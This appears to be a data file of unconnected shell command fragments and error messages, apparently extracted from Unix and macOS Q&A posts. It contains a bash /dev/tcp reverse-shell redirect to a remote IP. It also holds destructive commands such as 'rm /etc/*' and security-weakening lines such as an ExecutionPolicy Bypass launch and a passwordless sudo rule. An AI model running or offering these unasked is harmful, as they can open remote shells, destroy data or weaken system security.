ls Documents
complete | grep ls
complete -o default -F _longopt ls
locate Documents
complete | grep ls
echo $CDPATH
locate Documents
complete -f ls
rm -r
rm -r
xargs rm -r < list.txt
grep -P "^A.*[0-9]{2}$"
xargs -d"\n" rm
rm line
rm $(ls | grep -e '^A*[0..9]2$')
csh \!*
alias cat='cat -n !!:* && echo ""'
command cat
sudo chkconfig --add login.sh
cd ~1
Ctrl-a n
Ctrl-a p
Ctrl-a anyNumber
Ctrl-a doublequote
chmod o+x ~/Downloads/sublimetext/sublime_text
source /home/username/.bash_profile
source /root/.bash_profile
bash --version
shopt -s globstar
[[ -f "$f"/DONOTDELETE.TXT ]]
rm -f "$f"/*
typset | less
unset command_not_found_handle
sed -i
sed -i
man sudo
zip -j --split-size 2g $zipfilename *
tar -cf name_of_zip.tar directory/
tar -czf name_of_zip.tar.gz directory/
tar -cjf name_of_zip.tar.bz directory/
bzip2 -ck file -<number> > compress.bz
grep USERNAME /etc/passwd
<<EOF ... EOF
echo $something >> file.txt
echo -n
tr -d '\n'
tr -d '\n\r'
date +%S
'pattern {actions}'
man sed
$. % 3 == 1
$. == 1 or $. % 3 == 0
split -n r/i/n
(k % n) + 1 = i
split -n r/1/3
execvp: No such file or directory
ASCII NUL
-d $'\0'
-T - --null
-exec command {} +
svn log -q -v filename
svn diff -c M filename
svn log
-name '*.svn'
grep -d skip
find . \( -type d -name '.svn' -o -type f -name '*.html' \) -prune -o -print0 | xargs -0 grep ...
find . -name *.java -exec cp {} backups/ \;
ls -l
ls -l
ls -R
killall killall
pip install eyeD3
sudo apt install eyeD3
white space
| grep -v "what you don't want to include"
| sed -e ':a;N;$!ba;s/-\+\(\n[^\n]*\n\)\?//g'
sed --in-place $filter $file
sed -i
ssh-add .ssh/key
ps -ef
arg1 arg2 'argument 3'
perl -ne
&& do{print "$1\n"}
man sudo
cat foo
cat foo
some_program $variable
sh -c
ssh -L 3307:remote:3306 user@remote
ssh user@remote sleep 10 &
Some Text
cds some directory
cd some\ directory
$ cd 's
ome directory'/
with\ spaces
with spaces
builtin cd
with spaces
builtin cd with spaces/
builtin cd "with spaces"
pkill -9 mysql
pgrep [-lf] [-u uid] [-other options] pattern
pkill [-f] [-t**SIGNAL] pattern
-u user
man -c
man man
showkey --ascii
Settings -> Edit current profile
Key Combination
Window Filter
rvm implode
rm -rf ~/.rvm
export CC=/usr/bin/gcc-4.2
echo 'test \'hi\'' > test
'test '
test 'hi'
regedit /home/lee/desktop/Direct3D.reg
echo $TERM
ls c<TAB>
ls c*<TAB>
man zshoptions
exec 0</dev/pts/0
file -b *
ls -hs
file -b
"blah $@"
bash -c "other_tool -a -b$(printf "${1+ %q}" "$@")"
"other_tool -a -b ${*@Q}"
" %q"
escapeBashArgs "" ""
'' ''
escapeBashArgs " " "    "
' ' '    '
\  \ \ \ \
'a      b' 'c d' $'arg with\nnewline'
a\ \ \ \ \ \ b c\ d $'arg with\nnewline'
escapeBashArgs '$"'\''({:})'
escapeBashArgs x/\ \ \"b\"/aaaaa/\'xxx\ yyyy\'/zz\"offf\"
'x/  "b"/aaaaa/'\''xxx yyyy'\''/zz"offf"'
x/\ \ \"b\"/aaaaa/\'xxx\ yyyy\'/zz\"offf\"
/usr/bin/env bash
/usr/bin/env bash
( )
$( )
my_name() { }
echo "$var"
ls A*
usermod -l login-name old-name
sudo groupmod -n new-name current-name
sudo groupmod -o -n new-name current-name
chmod 755
chmod 0755 file
chmod +x
chmod +x
chmod 0755
[ (/bin/date +'%-d') -le 7 ] && foo
yum install sysstat
iostat -c
nohup /usr/local/tomcat6/bin/startup.sh
tr -s /
-bash: cd: mydir/: No such file or directory
sed -i ...
ls -lai
-iname "*.jpg"
ps -ef|grep myUser
kill -9
pkill mybinaryname
pgrep -U someUserName
rm -rf
-maxdepth 1
man bash
echo "Usage: ${0##*/} [-f] [-u user] [--] "
-exec rm {} +
ls -bl
ls -l
ls -li
find . -inum 12345 -exec rm -i {} \;
rm $'\r'
<carriage return>
mysqld &
cd /f/downloads/scripts.lnk/
mklink /D <link name> <target dir>
cd -P <link name>
find -name 'prefs.js' -exec more filecontent >> '{}' \;
export PATH
export PATH CC ANDROID_HOME
add_path `pwd`
rsync --existing -iprvn a/ b
:r !command
-exec ls -lhS {} \; | head -5
sort -n
-maxdepth 1
sudo service network-manager restart
ls -all /opt/com/internal/someFile
700 user:userGroup
cp /root/folder/someFile /opt/com/internal/someFile
cp /root/folder/someFile /opt/com/internal/someFile
cp -i
ls -la
comm --nocheck-order -23 file filter_file
'\u@\h \w $ ' is typical, in this the '\w' is a placeholder for the working directory. Setting
ffmpeg -itsoffset
4800 Hz
find ... -print0
xargs -0
mv "I am a picture.jpg" "I am a picture_thumb.jpg"
-exec bash ...
$(file={}; echo ${file:0:5})
export WORDCHARS=''
export PATH=$PATH:/home/username/scripts
--prefix ~/bin/xclip
--prefix ~/usr
--prefix ~/usr
export PATH=/usr/bin:/bin
awk '$1==3'
file -bi
cat -v
grep -P '[\x7f-\xff]' filename
file -D filename
recode -l
cat -v
set -x
xte 'key Space'
xte 'key space'
getconf ARG_MAX
git whatchanged --patch
tput smso
tput smso
man tput
svn diff
rvm use
rvm info
set -x
[[ !-z "$DEBUG" ]] && set -x
DEBUG=1 script.sh
echo "foo">> bar.txt
ls -l
ls -l
set -euo pipefail
@reboot /path/to/script
lsb_release -r
uname -a
grep -oP 'CODENAME=(.+)' -m 1 /etc/lsb-release | awk -F= '{ print $NF }'
grep -oP '\d+\.\d+' -m 1 /etc/lsb-release
$ sudo
$ sudo bash
sudo bash
sudo <shell>
sudo bash
sudo bash
sudo bash
sudo bash
cut -d/ -f-4
cut -d/ -f4-
export HISTCONTROL=ignoreboth
"$(history 1)" (if_not_duplicate) >> ~/.bash_history
$TIMEIT = time
sh -c
sh -c "time"
sh -c "time -p"
time -p
export HISTSIZE=99999999999999
M-x shell
echo $PROMPT_COMMAND
echo $PROMPT_COMMAND
[ "$TERM_PROGRAM" == "Apple_Terminal" ] && [ -z "$INSIDE_EMACS" ]
M-x shell
M-x shell
ls -lAFh /path/to/file
mysql -uroot
-lAFh /path/to/file
ls -lAFh /path/to/file
mysql -uroot
mysqladmni -uroot
mysqladmin -uroot
cp file{,.bk}
cp file file.bk
man readline
rm -- -x
rm ./-x
C-x C-r
help bind
default shell
find /path/to/files -type f
> filename
echo -n > filename
cat /dev/null > filename
find /path/to/files -type f -exec file '{}' \;
find /path/to/files -type f -exec echo -n > '{}' \;
| xargs
find /path/to/files -type f -exec /bin/sh -c "> '{}'" ';'
find /path -type f | while read file; do echo -n > "$file"; done
mv id_rsa* key_backup/
complete -r
help complete
sudo apt-get --purge remove bash-completion
complete -r
shopt -u progcomp
shopt -s progcomp
read line
read response
read input </dev/tty
rm -i
chmod +x yellow.sh
man bash
cd ..
sed -e 's//replacement/'
cat path/to/the/file
printf '%s' "$input"
sed -i
$(sed 's/[&/\]/\\&/g' <<<"$replace_text")
sed 's/3.14/pi/g'
-m 1
ls /opt
brew install git
hg diff
less 444
less 436
(...) | cut -b -80 | less -FSX
less -FS
scp user@ip:.bash_history .
bash profile
export HISTTIMEFORMAT='some format'
bash profile
open -e /usr/bin/stkLaunchAgent.sh
while true
: ${USER_BASH_COMPLETION_DIR:=~/.bash_completion.d}
vim example.txt someother.txt
:buffer <filename>
M-x ansi-term
M-x shell
emacs somefile
C-x C-f somefile<RET>
emacsclient somefile
man start-stop-daemon
grep bash
php -v
cd "/Volumes/TimeMachine/Backups.backupdb/charon/Latest/Macintosh HD/usr/bin/"
php -v
cd "/Volumes/TimeMachine/Backups.backupdb/charon"
cd "Macintosh HD/usr/bin"
which php
php -v
solaris 11g
bash: ./wls1036_solaris32.bin: Invalid argument
rm -r
tar tf
sort -r
sort -r
rm -i
tar xv
TERM=dumb less /etc/hosts
brew doctor
brew doctor
rm -r Mkvtoolnix.app
brew doctor
tree -d archive
7z x archive.7z -oarchive
tree -d archive ; rm -r archive
kill -1
set -o pipefail
man bash
set +o pipefail
if [ -f ~/.vimrc ];
sudo dhclient
sudo dhclient
ps -ef | grep tomcat
man bash
chmod -R 766 /src/http/cgi-bin
man bash
ls -l
sudo visudo
NO PASSWD
ps -A -o pid,cmd|grep xxx|head -n 1
pid, command
pgrep <command>
pidof xxx
git number
sh: /home/gulshan/bin/git-id: not found
find . -type f -name '*.txt'
-type f
sed -i '' -e 's/foo/bar/g'
man sed
chmod +x change
sed -i '' -e 's/foo/bar/g' somefolder/**/*.txt
python -u SCRIPT
diskutil list
diskutil info /dev/disk5s3
Volume UUID
diskutil info
i%N == 0
N = 1
password = foo
-k SKELETONDIR
man chsh
man find
man mv
man xargs
echo @path
move @path C:\destination\folder
man find
stty -a
man amixer
-type f
-maxdepth 1
find ./*
$prog abc
ps aux | grep SCREEN | sed -n 1p | awk '{ print $2; }'
[[ -d /path ]]
[[ "string" =~ "pattern"]]
local x=pwd f
cd /volumes
cd /Volumes
cd /Vol*
shopt -s nocaseglob
set completion-ignore-case on
bind "set completion-ignore-case on"
Terminal > Preferences > Settings
touch ~/.bash_profile
/bin/rm /Users/your-username/.profile
/usr/bin/tail -n 10 /Users/your-username/.bash_history
Could not open a new pseudo-tty
Could not open a new pseudo-tty.
ls -rt <some_dir> | tail -1
echo $0 $*
case "$TERM" in
$ shopt -s direxpand
[[ ]]
echo ...; exit 1
{ ... }
wc -c
gnome terminal
1, 2, 3 ..
Macintosh HD/Library/...
grep -P
while; shift
sudo splunk start --accept-license
sudo ./splunk set web-port 8001
head -5 /opt/splunk/bin/splunk
ssh from hostA to hostB
ls --color
ls -G
man terminfo
man termcap
:!echo $TERM
man ls
command not found
export PATH=/bin:/usr/bin:/sbin:/usr/sbin
-ovh: jurisedi@ssh1:~/xpdf$: No such file or directory
git checkout
git checkout d
gco d
unset -f alias_completion
awk -f script.awk file.txt
. ~/.bashrc
. ~/.bash_aliases
do shell script
do script
defaults write
zipinfo -t foo.zip
-i "*"
[ -f *.txt ]
[ -f ]
test -f
binary operator expected
too many arguments
GENERATED CONTENT
[ -f ]
PS1='\[\033[1;32m\]\u@\h\[\033[0m\]:\[\033[1;34m\]\w\[\033[0m\]\$ '
&& RET=0;
env | grep RET
cdparanoia -Q
--size <sectors*2352>
pv -L 176400
chflags -R hidden
chflags hidden
\( -name '*.pdf' -or -name '*.png' \)
-regextype posix-extended
-name *.pdf
find . -type f | egrep '.pdf$|.png$'
-regextype posix-egrep
killall Xcode.app
/some/dir to delete
rm -fR "/some/dir/to
delete"; mkdir /hello"
~/hello world.tmp
bash -c
cd ~/"MyDoc"; rm -f MyDoc.tgz; tar -czf MyDoc.tgz *
cout << std::endl
alias emerge='emerge -av'
sudo emerge foo
emerge foo
emerge -av foo
rcp ./justin.txt root@HPUXHOST:/usr/local/bin
sudo mv
rsync -avz -e "ssh" --rsync-path="sudo rsync"
for DIR in *; do ... done
[ -d "$DIR" ] && ...
cat "$DIR"/*.xml > "$DIR.xml"
cat ~/.bashr<TAB>
cat ~/.bashrc
vim ~/.bashr<TAB>
vim /home/neil/.bashrc
type function_name
screen -dmS screenname
screen -r screenname
& exit
kill -9 pid
screen -ls
exec PROGRAM
screen -dmS session vim
rc apache2 start
/etc/init.d/apache2 start
rc apa[TAB]
rc apache2
rc-start apache2
rc apache2 start
/etc/init.d/apache2 start
restart smartmontools
/etc/init.d/smartmontools restart
./my_service begin
./my_service run
./my_service halt
2031 3334 2e30 0a32 2032 3331 302e 000a
1 430.2 2 13.0
printf "$string"
help echo
which echo
sudo dpkg -i $myDeb.deb
_remoteInstallation "myPackage115.deb" "192.168.1.55"
couldn't execute "'/usr/bin/ssh": no such file or directory
sudo dpkg -i *
chmod 744 /usr/local/bin/debinstall.sh
:help -c
-bash: Eclipse.app: command not found
open <pdf>
man open
open Something.jpg
chmod +x /path/to/scriptname
launchctl load ~/Library/LaunchAgents/com.superuser.445907.plist
launchctl unload $path && launchctl load $path
man launchd
man launchd.plist
--editbox emptyfile
mogrify -format
mogrify -resize
'mydb.sql mydb.clean.sql mydb.lite.sql'
echo $PATH
set -x
set -x
find /cygdrive/c/MinGW/bin/ -name "*.exe" -exec ln -s {} basename {} \;
cp -s
source /opt/local/etc/bash_completion.d/git
source /opt/local/etc/bash-completion
host www.example.com
nslookup www.example.com
dig www.example.com
tail -n1
head -n1
find Makefile
free -m | sed -n 2p
free -m | sed -n 2p
$(bash -c 'test -z "$SET_ME" && echo Error;')
sh -c './program > file.txt; cat file.txt' &
gem install pagoda
$ pagoda
-type d
-type f
5  Blink: Slow less than 150 per minute
set -o history
history |tail -n2 |head -n1
time some_executable
valgrind --tool=callgrind
cp --parents /home/user/myfiles/...
bib2x -V
echo JAVA_HOME
set -f
echo *
while read -r LINE; do ... done
set +f
exec: 24: /bin/zsh: not found
Git Bash
"C:\Program Files\Git\bin\sh.exe" --login -i
ConEmu Here [Git Bash]
/single /cmd {Git Bash}
C:\Program Files\Git\mingw64\share\git\git-for-windows.ico
Robert Collier
{Bash::Git bash}
"a b" c
for arg
for arg in "$@"
# /etc/rc.d/daemon-name {start|stop|restart|status|...}
kill -9 cat /var/run/daemon.pid
cat /var/run/daemon.pid
kill -HUP cat /var/run/daemon.pid
cat /var/run/daemon.pid
ps cat /var/run/daemon.pid
cat /var/run/daemon.pid
man dbus-send
$ man find
.'  entry.  Additionally, its subdirectories (if any) each have a
echo $(find)
ls -Z
php -r "echo exec('whoami');"
chmod 755 dir; chmod 755 file
chmod u+s file
include_path ".:/usr/local/lib/php:/your/dir"
php_value include_path ".:/usr/local/lib/php:/your/dir"
Permission denied
map archive = no
root@ls:~# /usr/sbin/setenforce Permissive
shopt extdebug
trap 'insane_magic_alias' DEBUG
return 1
crontab -e
man crontab
find -type d -ctime +1
ssh ...
-o LogLevel=QUIET
LogLevel QUIET
-o 'RequestTTY no'
-o 'RequestTTY yes'
-o LogLevel=QUIET
-o LogLevel=ERROR
ssh -q
ls -A ~
wget example.com/imageID_{1..100}_2018.gif
for ((i=1;i<=100;i++)); do wget example.com/imageID_${i}_2018.gif; done
man wget
curl -L http://links.mrgray.com/ocrtest > /files/file.png
telnet whois.internic.net 43
find | xargs
find -exec cmd {} \;
find ./path/to/directory -print0 | LC_ALL=C sort --zero-terminated | tar --create --no-recursion --null --files-from /dev/stdin --file /dev/stdout --verbose --numeric-owner | sha1sum
<file path>
awk '{print $1}'
find . -type f
xargs -d'\n'
find -print0 | xargs -0
-P0 n1
sort -k 2
xargs -P0
sha1deep -r .
git remote add
time appcheck.sh
init 6
shutdown -r
chmod reboot
bash < /tmp/cmds
echo "echo \"hello world\" > /tmp/cmds"
export PROMPT_COMMAND="history -a; history -r; $PROMPT_COMMAND"
sh -c
read line
call foo.bat
mkdir /home/me/mysharedfolder
cd ˜/
hello world
-bash: ????: command not found
[1] 26489
source filename [arguments]
my $domainname = ".+";
Up/Down arrow keys
Up/Down arrow keys
cat text.txt | xargs ./Myscript.sh
cat test.txt | ./myEchoScript
tail -f
tail -f
tail -f /var/logs | less
tail -f /var/logs
screen -mdS logview -- tail -f /var/logs
multiuser on
screen -rS logview
./srcds_run -game tf -maxplayers 32
chmod -x run.sh
bash: ./run.sh: Permission denied
emacs file
id root
sudo bash
id your-username
sudo <some privileged command>
forever start -c node-dev app.js
Permission denied, please try again.
ssh -i /root/.ssh/id_rsa user@remote "command"
echo `id` > /tmp/whoami.log
. ~/.keychain/$HOSTNAME-sh
unset SSH_AUTH_SOCK
unset KRB5CCNAME
map ii <esc>
cd ~/Desktop
awk 'BEGIN {FS="\n"; RS=""}; $2!=$3 {print $1}'
set -o allexport
ls -a
for dir in ./images/* ./images/.*
touch SCRIPTstop
killall -SIGUSR1 $SCRIPTNAME
sudo apt-get install incron
incrontab -e
~/Dropbox/Attachments/ IN_MOVED_TO ~/script.sh
incrontab -e
~/ IN_CREATE touch ~/test
xdg-open <DIR>
Vishnu Kumar
/ebook selects medium-resolution output similar to the Acrobat Distiller "eBook" setting.
gs -sDEVICE=pdfwrite -dPDFSETTINGS=/ebook -dNOPAUSE -dBATCH -sOutputFile=reduced/output_1-102_TOC_[gs-ebook].pdf input_1-102_TOC.pdf
/printer selects output similar to the Acrobat Distiller "Print Optimized" setting.
gs -sDEVICE=pdfwrite -dPDFSETTINGS=/printer -dNOPAUSE -dBATCH -sOutputFile=reduced/output_1-102_TOC_[gs-printer].pdf input_1-102_TOC.pdf
/default selects output intended to be useful across a wide variety of uses, possibly at the expense of a larger output file.
gs -sDEVICE=pdfwrite -dPDFSETTINGS=/default -dNOPAUSE -dBATCH -sOutputFile=reduced/output_1-102_TOC_[gs-default].pdf input_1-102_TOC.pdf
/prepress selects output similar to Acrobat Distiller "Prepress Optimized" setting.
gs -sDEVICE=pdfwrite -dPDFSETTINGS=/prepress -dNOPAUSE -dBATCH -sOutputFile=reduced/output_1-102_TOC_[gs-prepress].pdf input_1-102_TOC.pdf
" "
alias ...
' '
e somedir
e .
subl .
e somedir
subl somedir
$ bash installer.sh
sed -i .bak '/^127\.0\.0\.1[[:space:]]/d' hosts
sed -i '' [...]
sed -ibak '/^127\.0\.0\.1[[:space:]]/d' hosts
sed -i [...]
mv hosts.new hosts
man ps
[Process exited - exit code 1]
[Process completed]
[Process exited - exit code 1]
man reset
java M
java MyProgram
nano M
nano MyProgram.java
nano MyProgram.
CH 0000100014/A10/11XT
my_exec | pv <whatever> | cat
man bash
mount -t cifs -o defaults,credentials=/etc/smbpass/demo.smbpass,uid=1005,gid=1005,dir_mode=0770,file_mod=0660 //xxx.xxx.xxx.xxx/demo/files /var/www/mysite/src/files/
file_put_contents('myfile.txt', 'blah');
fopen('filename', 'w');
echo -n "blah" > myfile.txt
large readwrite = no
ls --color=auto
sudo -s
cd /root
cd ~
cd /home/person
sudo su - root
find /home/Alison/workspace/DirLevel1/DirLevel2/DirLevel3/DirLevel4/DirLevel5/DirLevel6/DirLevel7/ -type d
tree -dfi /home/Alison/workspace/DirLevel1/DirLevel2/DirLevel3/DirLevel4/DirLevel5/DirLevel6/DirLevel7/
find . -type d
{old_NF=NF; prev=$0}
NF <= old_NF {print prev}
END {print $0}
hash -r
python myscript.py
shopt -s expand_aliases
echo $PATH
source .bash_profile
echo $PATH
cd /cygdrive/d/code
cd -
mdkir ~/bin
echo $PATH
/Users/<your username>/bin
mkdir ~/bin
sudo ln -s "/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl" ~/bin/subl
open ~
export PATH=$PATH:~/bin
source ~/.bash_profile
parted --script
parted --script /dev/sdb print
echo $DYLD_LIBRARY_PATH
\[ \]
c5:5:respawn:/sbin/agetty 57600 tty2 xterm-256color
bash -l
bash --login
cp -i
rm -i
set -e
set +e
man bash
man bash
sudo yum install Xdialog
apt-get install Xdialog
tail -f logfilename
open ~/.bash_profile
echo $PATH
> "outfile$num.txt"
for doc in $FILES
> /dev/null
chmod +x hello
chmod +x hello1
chmod +x hello2
./hello2 >/dev/null
cat $file
wget <someStuff>
date -u
ls dir1 | wc -l
sh -c
shopt -s dotglob
! -name .
cmd /v:on
curl https://raw.github.com/git/git/master/contrib/completion/git-completion.bash -o ~/.git-completion.bash
if [ -f ~/.git-completion.bash ]; then   . ~/.git-completion.bash; fi
shopt -s histappend
PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
export PROMPT_COMMAND='history -a'
history -w
pkill lxsession;
Picture -> PrintingSize
Bild -> Druckgröße
Exiftool '-*resolution*' c.jpg
gcc setRes.c -O3 -Wall -o setRes
Error: xyz may be not a .jpg file
-density width
-density widthxheight
convert -version
convert -list configure
(r.mods & keymask)
dd if=/dev/random bs=2 && ( grep 'foo' || grep 'woo' )
grep -E '(foo|woo)' /dev/random
echo $SHELL
ssh yourbox.example.com
ssh yourbox.example.com mighty_shellscript.sh
man bash
man bash
man bash
man mysqldump
JPEGOUT= date +%Y%m%d%H%M.jpg
find . -type f -exec cksum {} \;
fdupes -r .
sml file.sml | echo -e "\004"
sml file.sml | sleep 2 ; echo -e "\004"
sml file.sml | echo -e "\004"
sml file.sml
echo -e "\004"
sml file.sml | sleep 2 ; echo -e "\004"
a | (b; c; d)
sml file.sml
sleep 2
echo -e "\004"
echo -e "\004"
echo -n
pkill -f script_name
[process name]
trap INT ...
stty -a
stty intr ^C
kill -15 [pid]
kill -9 [pid]
man usermod
'\'Hello World\''
Hello World
for z in *.zip; do unzip "$z"; done
echo "$0: error --- log file $FILE not found" 1>&2
shopt -s globstar
find . -name 'foo'* -type f -delete
mount -t cifs
Courier New
Courier New
man bash
info bash / =~ RET
man 3 regex
man 3 regex
info regex
echo $PATH
echo $PATH
-mount  Don’t descend directories on other filesystems.
man find | less -p "-mount"
find / -name "badpattern" | grep -v "/path/to/USB_DRIVE"
eval "$path/aapt-orig $params"
cd /tmp/tmp.KVKc82GspR; find . -name '*'
grep bash
localhost [127.0.0.1] 8081 (tproxy) : Connection refused
tee -a ./file
ncat --help
man ncat
%q   quote the argument in a way that can be reused as shell input
help printf
alias sftp = with-readline sftp
alias sftp = with-readline sftp
command --arg1
cd subdir
cd ./subdir
-i eth0
tcpdump -i eth0
exit 1
echo $SHELL and echo $BASH_VERSION
"/usr/local/bin/bash" and "4.0.0(1)-release
M-x shell
C-x (
C-x )
C-x e
man bash | less +/shopt.*optname
svn ls
set editing-mode vi
-bash: /usr/bin/pico: No such file or directory
env | grep 'pico'
set -o emacs
./script logfile.log
vbell on
echo ^G
vbell off
vbell on/off
ctrl+a ctrl+g
CSI 0G
CSI 0G
sed 's/^.*\x1b\[0G//g'
sed 's/^.*\x1b\[0G//g'
tr -d '\r' < infile > outfile
set -vx
mount / /mount/point
cp /bin/bash /mount/point/bin/bash
linux rescue
set +m
echo "hello"
set -m
set +m
set +i
set +b
#!/bin/bash -x
make >& comp_output && vi comp_output
[[ -f "/path/to/file" ]]
foo=" bar "
foo="bar "
hash -r
alias rehash='hash -r'
ffmpeg -i %08d.jpg out.mp4
do script
osascript -e 'tell app "Terminal" to do script "/path/to/script.sh"'
do shell script
write text
Resource temporarily unavailable
All Processes
CTRL-A double-quote(")
ctrl-a "
ctrl-a {numberofscreen}
screen -r
screen -list
screen -S "sessionname"
screen -ls
Ctl-a w
-size +1M
env -0 | sort -z
export <variable>=<value>
export <variable>=<value>
export MYVAR
builtin export <variable>=<value>
#!/bin/bash -i
unset <variable>
builtin unset <variable>
#!/bin/bash -i
man bash
. file
source file
man bash
export HOME=/usr/local/bin:$HOME
respawn-pane -k
respawn-pane -t sessionname:0.4 -k 'some -new command'
-t right
-t left
-t 0.right
mvall . person user
man bash
man find
–execdir test -d {}/gnome-shell \; –print
–exec … \; –something
A B C
1 2 3
xargs -n 1
declare -p instances snapshots
C:\Windows\System32\cmd.exe /c ""C:\Program Files\Git\bin\sh.exe" --login -i"
<pig pig -x " " -z -r" " >pig pig pig
-f foo.tar
tr -d '\n' <filename>
ssh -t host  < script
man bash
man setfacl
export PATH=${PATH}:.
mv -v -f sourceDir destDir > out.file 2> err.file
echo -e
set -x
function set; echo + set $argv; builtin set $argv; end
find /search/path -type d
NUM=0; for file in /path/to/folder/*.jpg; do mv file NUM.jpg; let "NUM=NUM+1"; done;
sudo dd
man cp
uname -a
cat /proc/cpuinfo
df -h
echo $HOME
/usr/bin/nano .bash_profile
alias g="grep --color=always --exclude-dir=\*.svn\*"
alias g="grep --color=always $1 $2 | grep -v .svn"
echo 1 | tee /proc/sys/net/ipv4/ip_forward
export PATH=$PATH:/usr/bin
echo ${PATH:+$PATH:}
man bash
vi junk/1
cat junk/1
| sort -n
/     
     /
   
   
start cmd /c long_running_cmd
start cmd /k long_running_cmd
xterm -e ~/bin/launcher.sh "./long_running_cmd && kill $PPID" &
./long_running_cmd && kill $PPID
kill $!
chmod +x
zsh /path/to/script.sh
bad interpreter: /bin/zsh: no such file or directory
interpreter directive
#!/usr/bin/env bash
exec zsh "$0" "$@"
exec bash "$0" "$@"
rm /etc/*
man split
cd Applications
Applications (Parallels)
$ echo 1 | (echo -n 2 && cat)
export FIGNORE=.bin
cd /et
cd /us
cd /usr/
-s /bin/bash
set -e
which git
cd some_dir
[Process completed]
cat $(find ...)
ls -lrt
mv dir/* tar-dir
printf "\e[0;%sm %s \e[m\n" "$COLOR" "RED"
bundle exec irb
rbenv rehash
rpm2cpio rpm_name | cpio -ivd './a/b/c/*'
cpio.sh rpm_name './a/b/c/*' 's#^./a/b/#foo/#'
apt-get update
apt-get update
apt-get update
apt-get --force-yes -y --ignore-missing update
$ man date
tar -hcjf $path/somename
sudo apt-get install sshpass
defaults write com.apple.desktop.plist Background '{default = {Change = TimeInterval; ChangePath = "/Users/Username/Pictures/Wallpapers"; ChangeTime =  60; ImageFileAlias = <data>; ImageFilePath = "/Users/Username/Pictures/Wallpapers/05.jpg"; LastName = "Mandy Moore011.jpg"; NewChangePath = "~/Pictures/Wallpapers"; ; Random = YES; Placement =Crop;};}'
NewChangePath = "~/Pictures/Wallpapers"; ;
ImageFileAlias = <data>;
altscreen on
set t_ti= t_te=
TERM=xterm  vim
echo 1 2 4 3 | grep -o [1234567890]|sort
echo 10,2,4,3|tr ',' '\n'|sort -g
echo [10,2,4,3]|tr '[:punct:]' ' '|tr ' ' '\n'|sort -g
ls -1
export HOME=/directory/you/want
export HOME=newpath
export HOME=/home/newuser
/cygwin/c/Documents and Settings/username/My Documents
eject -v
groups | grep -o cdrom
ssh server -L 3392:192.168.1.138:3389
rdesktop 127.0.0.1:3392
sleep 5
which -a httpd
ps -ef | fgrep -i tilda | cut -d' ' -f4 | head -1
chmod +x
sudo sh /pathto/script.sh
ls -l
alias sl="sudo ls -l"
sudo nameofscript
[[ "$-" != *i* ]] && return
sublime () { ... }
/bin/zsh -f
command sudo
ls -alFtr
readlink -f
ls -l
ln -s ~/actual/file-{1,2}.txt ~/proper
echo "file 1" > actual/file–1.txt
cd ..
ls -l
xargs -a file_list.txt touch
cat file_list.txt | xargs -I % touch PATH/%
$ chmod -R 700 /home/user/.*
chmod -R
[[ ... ]]
which virtualenv
stat virtualenv
int main(int argc, char** argv)
export PATH=/opt/local/bin:/usr/sbin:$PATH
sort -u
. test.sh
. test.sh
/bin/bash ./test.sh
cat -v test.sh
\[ ... \]
man cp
cp -u
cd -
alias \-='cd -'
alias '-'='cd -'
--timestamping --no-use-server-timestamps
cdproject pr --> TAB TAB
source ~/cdproject-autocompletion.bash
cd -
cd foo
split -v
tail -f filename
mkdir -p
>& /dev/tcp/192.168.1.66/2539 0>& 1
disown -h
ps -ef | grep java
ps -m
bash -l
cd $1/codebase ; find . -type ...
chmod +x whatever.sh
./whatever.sh 4
strace -efile calendar
find -mmin -2
find -amin -2
-mtime +5
-mtime +5
-mtime -5
man unzip
xdotool search
ps -A
seq 15 -1 1
for file {1..100000}; do echo "downloading: $file" >&2 ; curl [whatever] ; done
for file {1..100000}; do echo "downloading: $file" >> progress.out ; curl [whatever] ; done
curl [whatever] | tee progress.out
watch -n5 "grep -c '[unique file delimiter]' progress.out"
do ... done
command &
command &> /dev/null
rm -rf \~
rm -rf ./\~
echo $CATALINA_HOME
man bash
man sed
make -s
make install
env -i
$ man commandname
readonly HISTSIZE
chattr +a .bash_history
bg %1
disown -h
ctrl + left/right arrow
$(find ...)
find ... -print0 | xargs -0 ...
unset IFS
find ... -print0 | parallel -0 ...
< test
split(" ")
print "#{e} "
while (++i<=NF)
printf (!a[$i]++) ? $i FS : ""
$i FS : ""
print ""
1 2 3 5 4 1 2 3
1 2 3
5 4 1 2 3
while (<>)
for (@F) {
print "$F[$c]\t$F[$c+=1]"
if $F[$c+1];
top -l 3 -n 10 -o "vprvt"
awk '{ print $2, $1 }'
sort -n
comand > my.txt
set -x;trap 'test -s /dev/stdin||exit' debug
pass 4 2 45 2 release i386-apple-darwin10.8.0
pass 3 2 48 1 release x86_64-apple-darwin10.0
fail 4 2 37 1 release x86_64-pc-linux-gnu
cat /proc/self/fdinfo/0
command 2> sample.txt
echo "" > sample.txt
[[ -n $n ]]
for i in ${!a[@]}; do
CREATE USER
echo pwd
vorbis-tools flac python-mutagen
/home/jeroen/bpmtagging.sh: line 67: warning: here-document at line 4 delimited by end-of-file (wanted
/home/jeroen/bpmtagging.sh: line 68: syntax error: unexpected end of file
. ~/.bash_profile
/bin/sh: 28: /etc/bash_completion: [[: not found
bash --rcfile <your file here>
cat >screenRcTest
cat >screenSplitTest
chmod +x screenSplitTest
Ctrl-A d
mkdir sune1
mkdir sune2
mkdir sune2
sudo echo something > /etc/network/interfaces
bash: /etc/network/interfaces: Permission denied
sudo nano /etc/network/interfaces
sudo nano /etc/network/interfaces
sudo echo something > /etc/network/interfaces
sudo bash -c "echo something > /etc/network/interfaces"
su -
curl 'https://www.grc.com/passwords.htm' | grep '63 random printable ASCII characters:' | sed 's/^.*size=2>//' | sed 's/<\/font>.*$//' | pbcopy
as arguments
if [[ "$VAR" ]];
if [ $VAR ];
set TERM=xterm-256color
rm *.*~
rm *~
shopt -s dotglob
cd BackupDirectory
cd backupdirectory
bind "set completion-ignore-case on"
cd b
cd backupdirectory
tar -cvf allfiles.tar -T mylist.txt
C:\Users\<your user name>
echo $HOME
chmod +x -- -sh
blah/bin/blah install
input first_input, second_input | blah/bin/blah install
svnversion .
man zshexpn
git rebase
git status
exec $SHELL
man bash
> file
head -n -3 file
read another_thing
$0 ~ p[k]
pat='alfa beta gamma'
pat='^a a$ alfa beta gamma'
grep -c
wc -l
a b c ... z
-maxdepth 1
-type f
xargs -I
"cmd //c tree"
tree -L 2
C:\Program Files\Git\usr\bin
pacman -Sy tree
ssh host cat something.tar | tar x
tar x
PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File Path\To\Script.ps1 %1
tail -f
perldoc perlfaq5
man perlfaq5
seek(GWFILE, 0, 1)
